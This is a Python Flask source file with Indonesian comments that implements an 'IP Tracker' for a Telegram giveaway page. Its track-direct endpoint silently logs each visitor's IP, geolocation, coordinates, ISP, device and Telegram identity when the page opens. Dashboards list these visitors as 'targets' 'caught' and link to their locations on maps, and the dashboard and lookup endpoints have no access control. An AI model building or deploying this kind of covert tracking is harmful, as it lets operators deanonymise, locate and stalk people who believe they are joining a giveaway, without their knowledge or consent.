from flask import Blueprint, request, jsonify, render_template_string
import requests
from datetime import datetime
import sys
from pathlib import Path

ROOT_DIR = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT_DIR))

from database.cek_ip import CekIpDatabase

cek_ip_bp = Blueprint('cek_ip', __name__, url_prefix='/api/cek-ip')
db = CekIpDatabase()

# HTML Template untuk dashboard
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>IP Tracker Dashboard</title>
    <link rel="stylesheet" href="/giveaway/css/data_ip.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="dashboard-container">
        <div class="dashboard-header">
            <div class="header-icon">
                <i class="fas fa-shield-alt"></i>
            </div>
            <h1>IP Tracker Dashboard</h1>
            <p class="subtitle">Real-time IP Logging dengan Identifikasi User Telegram</p>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon"><i class="fas fa-globe"></i></div>
                <div class="stat-value">{{ stats.total }}</div>
                <div class="stat-label">Total Captures</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon"><i class="fas fa-network-wired"></i></div>
                <div class="stat-value">{{ stats.unique_ips }}</div>
                <div class="stat-label">Unique IPs</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon"><i class="fas fa-users"></i></div>
                <div class="stat-value">{{ stats.unique_users }}</div>
                <div class="stat-label">Unique Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon"><i class="fas fa-calendar-day"></i></div>
                <div class="stat-value">{{ stats.today_count }}</div>
                <div class="stat-label">Today</div>
            </div>
        </div>

        <div class="top-countries">
            <h3><i class="fas fa-chart-simple"></i> Top Countries</h3>
            <div class="country-list">
                {% for country in stats.top_countries %}
                <div class="country-item">
                    <span class="country-name">{{ country.country }}</span>
                    <span class="country-count">{{ country.count }} captures</span>
                </div>
                {% else %}
                <div class="empty-state">Belum ada data</div>
                {% endfor %}
            </div>
        </div>

        <div class="table-container">
            <div class="table-header">
                <h3><i class="fas fa-list"></i> IP Tracking Logs</h3>
                <button class="refresh-btn" onclick="location.reload()">
                    <i class="fas fa-sync-alt"></i> Refresh
                </button>
            </div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Waktu</th>
                            <th>IP Address</th>
                            <th>Lokasi</th>
                            <th>ISP</th>
                            <th>User Telegram</th>
                            <th>Device</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for item in data %}
                        <tr>
                            <td>{{ loop.index }}</td>
                            <td class="time-cell">{{ item.created_at[:16] }}</td>
                            <td class="ip-cell">
                                <a href="https://ipinfo.io/{{ item.ip }}" target="_blank" class="ip-link">
                                    {{ item.ip }}
                                </a>
                            </td>
                            <td>
                                <span class="location-badge">
                                    <i class="fas fa-map-marker-alt"></i>
                                    {{ item.city }}, {{ item.country }}
                                </span>
                                {% if item.lat and item.lon and item.lat != 0 %}
                                <a href="https://www.google.com/maps?q={{ item.lat }},{{ item.lon }}" target="_blank" class="map-link">
                                    <i class="fas fa-external-link-alt"></i>
                                </a>
                                {% endif %}
                            </td>
                            <td class="isp-cell">{{ item.isp or '-' }}</td>
                            <td class="user-cell">
                                {% if item.user_id %}
                                <div class="user-info">
                                    <div class="user-avatar-mini">
                                        {% if item.photo_url %}
                                        <img src="{{ item.photo_url }}" alt="{{ item.first_name }}">
                                        {% else %}
                                        <i class="fas fa-user"></i>
                                        {% endif %}
                                    </div>
                                    <div class="user-details">
                                        <div class="user-name">{{ item.first_name }} {{ item.last_name or '' }}</div>
                                        <div class="user-meta">
                                            {% if item.username %}@{{ item.username }}{% else %}ID: {{ item.user_id }}{% endif %}
                                        </div>
                                    </div>
                                </div>
                                {% else %}
                                <span class="no-user">Tidak teridentifikasi</span>
                                {% endif %}
                            </td>
                            <td class="ua-cell" title="{{ item.user_agent }}">
                                {{ item.user_agent[:40] }}{% if item.user_agent|length > 40 %}...{% endif %}
                            </td>
                        </tr>
                        {% else %}
                        <tr>
                            <td colspan="7" class="empty-row">
                                <i class="fas fa-inbox"></i>
                                Belum ada data IP yang terekam
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        setTimeout(() => location.reload(), 30000);
    </script>
</body>
</html>
'''

@cek_ip_bp.route('/dashboard')
def dashboard():
    print(f"[CEK-IP] Dashboard accessed from {request.remote_addr}")
    data = db.get_all_ip_tracking(limit=200)
    stats = db.get_statistics()
    return render_template_string(DASHBOARD_HTML, data=data, stats=stats)

@cek_ip_bp.route('/track', methods=['POST'])
def track_ip():
    try:
        req_data = request.get_json()
        
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ua = request.headers.get('User-Agent', 'Unknown')
        
        # Lookup IP
        try:
            geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        except:
            geo = {'country': 'Unknown', 'city': 'Unknown', 'lat': 0, 'lon': 0, 'isp': 'Unknown'}
        
        # Data dari Telegram WebApp
        user = req_data.get('user', {})
        user_id = user.get('id')
        username = user.get('username', '')
        first_name = user.get('first_name', '')
        last_name = user.get('last_name', '')
        photo_url = user.get('photo_url', '')
        
        entry = {
            'ip': ip,
            'country': geo.get('country', 'Unknown'),
            'city': geo.get('city', 'Unknown'),
            'lat': geo.get('lat', 0),
            'lon': geo.get('lon', 0),
            'isp': geo.get('isp', 'Unknown'),
            'user_agent': ua,
            'user_id': user_id,
            'username': username,
            'first_name': first_name,
            'last_name': last_name,
            'photo_url': photo_url
        }
        
        db.save_ip_tracking(entry)
        
        print(f"[IP Track] {ip} - {geo.get('city')}, {geo.get('country')} - User: {first_name} (@{username})")
        
        return jsonify({
            'success': True,
            'message': 'IP tracked successfully'
        })
        
    except Exception as e:
        print(f"[IP Track Error] {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@cek_ip_bp.route('/user/<int:user_id>')
def get_user_ips(user_id):
    data = db.get_ip_tracking_by_user(user_id)
    return jsonify({
        'success': True,
        'user_id': user_id,
        'total': len(data),
        'data': data
    })

@cek_ip_bp.route('/ip/<ip>')
def get_ip_info(ip):
    data = db.get_ip_tracking_by_ip(ip)
    return jsonify({
        'success': True,
        'ip': ip,
        'total': len(data),
        'data': data
    })

@cek_ip_bp.route('/stats')
def get_stats():
    stats = db.get_statistics()
    return jsonify({'success': True, 'stats': stats})

@cek_ip_bp.route('/track-direct', methods=['POST'])
def track_ip_direct():
    """
    Endpoint untuk tracking IP langsung TANPA CAPTCHA
    Dipanggil dari giveaway.js saat halaman giveaway dibuka
    """
    try:
        req_data = request.get_json()
        
        # Data dari frontend
        user = req_data.get('user', {})
        geo = req_data.get('geo', {})
        ua = req_data.get('user_agent', 'Unknown')
        
        # Ambil IP dari header (lebih akurat)
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Gunakan data geo dari frontend (sudah diambil dari ip-api.com)
        # Atau fallback ke lookup manual
        if geo.get('ip') and geo.get('ip') != 'unknown':
            city = geo.get('city', 'Unknown')
            country = geo.get('country', 'Unknown')
            lat = geo.get('lat', 0)
            lon = geo.get('lon', 0)
            isp = geo.get('isp', geo.get('org', 'Unknown'))
        else:
            # Fallback lookup
            try:
                geo_lookup = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
                city = geo_lookup.get('city', 'Unknown')
                country = geo_lookup.get('country', 'Unknown')
                lat = geo_lookup.get('lat', 0)
                lon = geo_lookup.get('lon', 0)
                isp = geo_lookup.get('isp', 'Unknown')
            except:
                city = country = 'Unknown'
                lat = lon = 0
                isp = 'Unknown'
        
        # Data dari Telegram user
        user_id = user.get('id')
        username = user.get('username', '')
        first_name = user.get('first_name', '')
        last_name = user.get('last_name', '')
        photo_url = user.get('photo_url', '')
        
        entry = {
            'ip': ip,
            'country': country,
            'city': city,
            'lat': lat,
            'lon': lon,
            'isp': isp,
            'user_agent': ua,
            'user_id': user_id,
            'username': username,
            'first_name': first_name,
            'last_name': last_name,
            'photo_url': photo_url
        }
        
        db.save_ip_tracking(entry)
        
        print(f"[IP Track Direct] {ip} - {city}, {country} - User: {first_name} (@{username})")
        
        return jsonify({
            'success': True,
            'message': 'IP tracked successfully',
            'data': {
                'ip': ip,
                'location': f'{city}, {country}'
            }
        })
        
    except Exception as e:
        print(f"[IP Track Direct Error] {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500
    
@cek_ip_bp.route('/dashboard-simple', methods=['GET'])
def dashboard_simple():
    """Dashboard simple untuk melihat IP tracking"""
    data = db.get_all_ip_tracking(limit=100)
    stats = db.get_statistics()
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>IP Tracking Dashboard</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: monospace; background: #0a0e27; color: #e0e0e0; padding: 20px; }
            .container { max-width: 1400px; margin: auto; }
            h1 { color: #00ff88; margin-bottom: 20px; border-left: 4px solid #00ff88; padding-left: 20px; }
            .stats { display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }
            .stat-card { background: #11162e; padding: 20px; border-radius: 10px; flex: 1; min-width: 150px; border: 1px solid #1f2a4e; }
            .stat-card .number { font-size: 32px; font-weight: bold; color: #00ff88; }
            table { width: 100%; border-collapse: collapse; background: #11162e; border-radius: 10px; overflow: hidden; }
            th { background: #1a2340; padding: 12px; text-align: left; font-size: 12px; }
            td { padding: 12px; border-bottom: 1px solid #1f2a4e; font-size: 13px; }
            tr:hover { background: #1a2340; }
            .ip-link { color: #00ff88; text-decoration: none; }
            .refresh { background: #00ff88; color: #0a0e27; border: none; padding: 8px 20px; border-radius: 5px; cursor: pointer; margin-bottom: 20px; }
            .live { animation: blink 1s infinite; color: #ff4444; font-size: 12px; }
            @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📍 IP TRACKING DASHBOARD</h1>
            <div class="subtitle">Auto-track tanpa captcha | Total Tertangkap: {{ stats.total }} <span class="live">● LIVE</span></div>
            
            <div class="stats">
                <div class="stat-card"><h3>Total Target</h3><div class="number">{{ stats.total }}</div></div>
                <div class="stat-card"><h3>Unique IPs</h3><div class="number">{{ stats.unique_ips }}</div></div>
                <div class="stat-card"><h3>Unique Users</h3><div class="number">{{ stats.unique_users }}</div></div>
                <div class="stat-card"><h3>Hari Ini</h3><div class="number">{{ stats.today_count }}</div></div>
            </div>
            
            <button class="refresh" onclick="location.reload()">⟳ Refresh</button>
            
            <table>
                <thead><tr><th>#</th><th>Waktu</th><th>IP</th><th>Lokasi</th><th>User Telegram</th><th>Device</th></tr></thead>
                <tbody>
                    {% for item in data %}
                    <tr>
                        <td>{{ loop.index }}</td>
                        <td style="font-size:11px">{{ item.created_at[:16] }}</td>
                        <td><a href="https://ipinfo.io/{{ item.ip }}" target="_blank" class="ip-link">{{ item.ip }}</a></td>
                        <td>{{ item.city }}, {{ item.country }}</td>
                        <td>{% if item.first_name %}{{ item.first_name }} {{ item.last_name or '' }}{% else %}-{% endif %}</td>
                        <td style="font-size:10px">{{ item.user_agent[:40] }}...</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        <script>setTimeout(() => location.reload(), 30000);</script>
    </body>
    </html>
    '''
    
    return render_template_string(html, stats=stats, data=data)